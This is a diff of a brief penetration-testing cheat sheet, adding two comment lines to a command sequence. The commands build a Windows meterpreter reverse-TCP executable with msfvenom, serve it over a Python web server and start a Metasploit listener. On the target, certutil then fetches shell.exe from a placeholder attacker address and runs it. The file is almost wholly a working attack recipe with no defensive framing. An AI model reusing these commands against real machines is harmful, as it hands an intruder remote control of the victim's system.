@@ -1,6 +1,6 @@
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe > shell.exe   
 
-
+## Make sure payload is in directory
 python3 -m http.server 80
 
 msfconsole
@@ -10,6 +10,7 @@ set LHOST <Attacker_IP>
 set LPORT 4444
 run
 
+## On windows target machine
 certutil -urlcache -f http://<Attacker_IP>/shell.exe shell.exe
 shell.exe
 
